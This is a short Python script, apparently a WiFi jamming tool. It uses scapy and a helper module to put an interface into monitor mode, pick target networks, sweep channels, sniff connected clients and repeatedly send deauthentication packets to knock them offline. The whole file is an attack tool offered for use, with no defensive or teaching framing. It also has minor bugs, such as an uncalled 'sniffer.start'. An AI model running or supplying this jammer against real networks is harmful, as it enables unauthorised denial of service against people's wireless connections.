#! /usr/bin/env python3

from scapy.all import *
from threading import Thread
import time
import os
import sys
import argparse

parser = argparse.ArgumentParser(description='Jam WiFi network by sending deauth packet to client')
parser.add_argument('IFACE', help='Network Interface to use', type=str)
args = parser.parse_args()

iface = args.IFACE

from modules.networksclients import *

check_perm()
monitor('on', iface=iface)


try :
    ap_list = choose_from_networks(get_networks(iface=iface))
except :
    monitor('off', iface=iface)
    sys.exit(1)

chan_list = get_chan_list(ap_list)
channel_sweeper = Thread(target=channel_sweep, kwargs=dict(chan_list=chan_list, iface=iface))
channel_sweeper.daemon = True
channel_sweeper.start()

sniffer = Thread(target=sniff_clients, kwargs=dict(iface=iface))
sniffer.daemon = True
sniffer.start()

sniffer.join()
while True:
    sniffer.start
    clients = get_client()
    print(clients)
    client_list = []
    for ap in ap_list:
        client_list += ap.get_client_list(clients)

    jam_network(client_list, iface=iface, loop=20)
    sniffer.join()


#monitor('off', iface=iface)
